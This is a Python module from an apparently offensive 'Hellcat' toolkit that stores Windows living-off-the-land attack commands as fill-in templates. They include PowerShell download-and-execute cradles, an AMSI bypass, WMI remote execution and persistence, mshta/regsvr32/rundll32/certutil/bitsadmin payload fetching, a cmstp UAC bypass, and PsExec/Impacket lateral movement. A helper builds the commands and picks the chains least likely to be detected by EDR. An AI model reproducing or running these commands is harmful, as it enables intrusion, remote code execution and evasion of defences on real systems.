"""
Hellcat LOTL (Living Off The Land) Framework
=============================================
PowerShell download cradles, WMI remote execution, LOLBin chains,
PsExec variants — each with EDR detection probability estimates.
Based on LOLBAS project + ATT&CK T1218/T1059/T1047.
"""
from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional


@dataclass
class LOTLTechnique:
    name: str = ""
    binary: str = ""
    mitre_id: str = ""
    description: str = ""
    command_template: str = ""
    detection_probability: float = 0.5   # 0-1, higher = more likely detected
    requires_admin: bool = False
    category: str = ""   # execution, download, bypass, persistence


# ---------------------------------------------------------------------------
# PowerShell Cradles
# ---------------------------------------------------------------------------

PS_CRADLES: List[LOTLTechnique] = [
    LOTLTechnique(
        "ps_iex_webclient", "powershell.exe", "T1059.001",
        "IEX with WebClient download cradle",
        'powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(\'{url}\')"',
        0.7, False, "download",
    ),
    LOTLTechnique(
        "ps_encoded_command", "powershell.exe", "T1059.001",
        "Base64 encoded command execution",
        'powershell -ep bypass -enc {b64_command}',
        0.5, False, "execution",
    ),
    LOTLTechnique(
        "ps_invoke_restmethod", "powershell.exe", "T1059.001",
        "Invoke-RestMethod download (less monitored)",
        'powershell -ep bypass -c "$x=irm \'{url}\';IEX $x"',
        0.4, False, "download",
    ),
    LOTLTechnique(
        "ps_amsi_bypass_iex", "powershell.exe", "T1562.001",
        "AMSI bypass followed by IEX cradle",
        'powershell -ep bypass -c "[Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\').GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue($null,$true);IEX(irm \'{url}\')"',
        0.6, False, "bypass",
    ),
]

# ---------------------------------------------------------------------------
# WMI Techniques
# ---------------------------------------------------------------------------

WMI_TECHNIQUES: List[LOTLTechnique] = [
    LOTLTechnique(
        "wmi_process_create", "wmic.exe", "T1047",
        "WMI remote process creation",
        'wmic /node:"{target}" /user:"{user}" /password:"{pass}" process call create "{command}"',
        0.5, False, "execution",
    ),
    LOTLTechnique(
        "wmi_event_subscription", "wmic.exe", "T1546.003",
        "WMI permanent event subscription for persistence",
        'wmic /NAMESPACE:"\\\\root\\subscription" PATH __EventFilter CREATE Name="{name}",EventNamespace="root\\cimv2",QueryLanguage="WQL",Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"',
        0.3, True, "persistence",
    ),
]

# ---------------------------------------------------------------------------
# LOLBin Chains (LOLBAS-based)
# ---------------------------------------------------------------------------

LOLBIN_TECHNIQUES: List[LOTLTechnique] = [
    LOTLTechnique(
        "mshta_execute", "mshta.exe", "T1218.005",
        "Execute HTA payload via mshta",
        'mshta "{url}"',
        0.6, False, "execution",
    ),
    LOTLTechnique(
        "regsvr32_scrobj", "regsvr32.exe", "T1218.010",
        "Regsvr32 scriptlet execution (Squiblydoo)",
        'regsvr32 /s /n /u /i:{url} scrobj.dll',
        0.5, False, "execution",
    ),
    LOTLTechnique(
        "rundll32_javascript", "rundll32.exe", "T1218.011",
        "Rundll32 JavaScript execution",
        'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("{command}")',
        0.5, False, "execution",
    ),
    LOTLTechnique(
        "certutil_download", "certutil.exe", "T1105",
        "CertUtil URL download and decode",
        'certutil -urlcache -split -f "{url}" {output} && certutil -decode {output} {decoded}',
        0.6, False, "download",
    ),
    LOTLTechnique(
        "bitsadmin_download", "bitsadmin.exe", "T1105",
        "BITSAdmin file download",
        'bitsadmin /transfer myJob /download /priority normal {url} {output}',
        0.4, False, "download",
    ),
    LOTLTechnique(
        "cmstp_bypass", "cmstp.exe", "T1218.003",
        "CMSTP UAC bypass and code execution",
        'cmstp.exe /ni /s {inf_file}',
        0.3, False, "bypass",
    ),
    LOTLTechnique(
        "forfiles_execute", "forfiles.exe", "T1202",
        "Forfiles indirect command execution",
        'forfiles /p c:\\windows\\system32 /m notepad.exe /c "{command}"',
        0.2, False, "execution",
    ),
    LOTLTechnique(
        "wscript_execute", "wscript.exe", "T1059.005",
        "Windows Script Host execution",
        'wscript.exe {script_path}',
        0.5, False, "execution",
    ),
]

# ---------------------------------------------------------------------------
# PsExec Variants
# ---------------------------------------------------------------------------

PSEXEC_VARIANTS: List[LOTLTechnique] = [
    LOTLTechnique(
        "psexec_service", "psexec.exe", "T1569.002",
        "Classic PsExec via service creation",
        'psexec.exe \\\\{target} -u {user} -p {pass} -s {command}',
        0.8, True, "execution",
    ),
    LOTLTechnique(
        "smbexec_named_pipe", "smbexec.py", "T1021.002",
        "Impacket smbexec via named pipes",
        'smbexec.py {domain}/{user}:{pass}@{target} "{command}"',
        0.6, False, "execution",
    ),
    LOTLTechnique(
        "atexec_scheduled", "atexec.py", "T1053.005",
        "Impacket atexec via scheduled tasks",
        'atexec.py {domain}/{user}:{pass}@{target} "{command}"',
        0.4, False, "execution",
    ),
    LOTLTechnique(
        "wmiexec_dcom", "wmiexec.py", "T1047",
        "Impacket wmiexec via DCOM",
        'wmiexec.py {domain}/{user}:{pass}@{target} "{command}"',
        0.5, False, "execution",
    ),
]


# ---------------------------------------------------------------------------
# Unified LOTL Manager
# ---------------------------------------------------------------------------

ALL_TECHNIQUES: Dict[str, List[LOTLTechnique]] = {
    "powershell": PS_CRADLES,
    "wmi": WMI_TECHNIQUES,
    "lolbin": LOLBIN_TECHNIQUES,
    "psexec": PSEXEC_VARIANTS,
}


class LOTLManager:
    """Living Off The Land technique manager."""

    @staticmethod
    def get_techniques(category: str = "all") -> List[LOTLTechnique]:
        if category == "all":
            return [t for group in ALL_TECHNIQUES.values() for t in group]
        return ALL_TECHNIQUES.get(category, [])

    @staticmethod
    def get_by_detection_risk(max_risk: float = 0.5) -> List[LOTLTechnique]:
        return [t for group in ALL_TECHNIQUES.values()
                for t in group if t.detection_probability <= max_risk]

    @staticmethod
    def build_command(technique_name: str, **params: Any) -> Optional[str]:
        for group in ALL_TECHNIQUES.values():
            for t in group:
                if t.name == technique_name:
                    cmd = t.command_template
                    for k, v in params.items():
                        cmd = cmd.replace(f"{{{k}}}", str(v))
                    return cmd
        return None

    @staticmethod
    def suggest_chain(objective: str = "execution") -> List[LOTLTechnique]:
        """Suggest stealthy LOTL chain for a given objective."""
        candidates = [t for group in ALL_TECHNIQUES.values()
                      for t in group if t.category == objective]
        return sorted(candidates, key=lambda t: t.detection_probability)[:3]

    @staticmethod
    def list_categories() -> List[str]:
        return list(ALL_TECHNIQUES.keys())

    @staticmethod
    def stats() -> Dict[str, Any]:
        total = sum(len(g) for g in ALL_TECHNIQUES.values())
        avg_detect = sum(t.detection_probability for g in ALL_TECHNIQUES.values() for t in g) / max(total, 1)
        return {
            "total_techniques": total,
            "categories": {k: len(v) for k, v in ALL_TECHNIQUES.items()},
            "avg_detection_probability": round(avg_detect, 2),
        }
